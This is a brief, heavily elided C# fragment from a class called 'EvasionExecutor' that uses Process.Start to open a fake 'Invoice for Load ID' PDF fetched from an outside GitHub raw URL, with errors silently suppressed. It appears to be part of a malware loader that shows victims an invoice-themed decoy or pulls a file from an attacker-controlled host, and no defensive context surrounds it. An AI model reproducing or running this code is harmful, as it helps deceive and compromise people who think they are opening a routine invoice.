...
public class EvasionExecutor
{
  ...
  public void Execute()
  {
    ...
    try
    {
      ...
      // Use Start-Process for better control from PowerShell context, but Process.Start is fine here.
      Process.Start("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/Invoice%20for%20Load%20ID%2080814532.pdf");
    }
    catch {}
